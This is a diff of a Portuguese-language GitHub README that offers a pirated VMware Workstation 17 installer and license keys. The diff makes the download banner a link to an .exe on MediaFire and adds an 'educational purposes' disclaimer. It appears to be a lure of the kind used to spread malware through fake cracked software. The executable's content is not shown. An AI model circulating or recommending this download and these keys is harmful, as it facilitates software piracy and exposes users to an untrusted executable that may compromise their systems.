@@ -1,6 +1,6 @@
 # 🚀 Programa-chave VMware Workstation 17
 
-![Download do VMware Workstation 17](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/downloadbjpg.jpg)
+[![Download do VMware Workstation 17](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/downloadbjpg.jpg)](https://www.mediafire.com/file/csjrcpy9lvdqdfi/VMware.workstation.17.exe)
 
 ## 🔍 Descrição
 Este repositório contém o **instalador do VMware Workstation 17** e as chaves de licença para ativação. Ideal para quem deseja explorar o mundo da virtualização e testar ambientes seguros.
@@ -16,7 +16,7 @@ Para instalar o VMware Workstation 17, siga os passos abaixo:
 ## 💾 Chaves de Licença
 As chaves de licença estão disponíveis [neste arquivo](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/LicenseKeys_VMwareWorkstationPro17).
 
-![Chaves de Licença do VMware Workstation Pro 17](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/imagemativação.png)
+[![Chaves de Licença do VMware Workstation Pro 17](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/imagemativação.png)](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/LicenseKeys_VMwareWorkstationPro17)
 
 ## 🤝 Contribuindo
 Contribuições são bem-vindas! Se você deseja adicionar algo ao projeto, siga estas etapas:
@@ -30,6 +30,10 @@ Contribuições são bem-vindas! Se você deseja adicionar algo ao projeto, siga
 ## 🔗 Contato
 Siga-me no Instagram: [@jhenriqueonline](https://www.instagram.com/jhenriqueonline)
 
-![Instagram de JHenrique Online](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/instagram-1.png)
+[![Instagram de JHenrique Online](https://github.com/PiratadoCodigo/Programa-chave-VMware-Workstation17/blob/main/instagram-1.png)](https://www.instagram.com/jhenriqueonline)
 
-##
+## 🛡️ Licença
+Este projeto está licenciado sob a Licença MIT. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.
+
+## ⚠️ Aviso
+**Este repositório é para fins educacionais e de teste. Use com responsabilidade!**
